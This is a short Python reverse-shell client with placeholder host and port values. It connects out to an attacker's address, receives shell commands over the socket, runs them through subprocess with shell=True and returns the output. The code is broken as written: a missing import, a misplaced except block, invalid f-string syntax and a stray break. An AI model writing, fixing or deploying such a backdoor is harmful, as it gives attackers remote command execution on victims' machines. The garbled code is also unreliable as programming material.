import time
import socket
import colorama
from colorama import Fore, Back, Style
colorama.init()

cliente=socket.socket()
try:
    cliente.connect(("youriphere",porthere))
    cliente.send("1".encode("ascii"))
    
    while True:
        comandoBytes=cliente.recv(1024)
        comandoCodificado=comandoBytes.decode("ascii")
        comando=subprocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        cliente.send(comando.stdout.read())
    except:
        print(f{Fore_RED}"[-] Something went wrong [-]")
        print(f{Fore_CYAN}"[!] Press Any key to exit [!]")
    input()
    break

#with love, jair david <3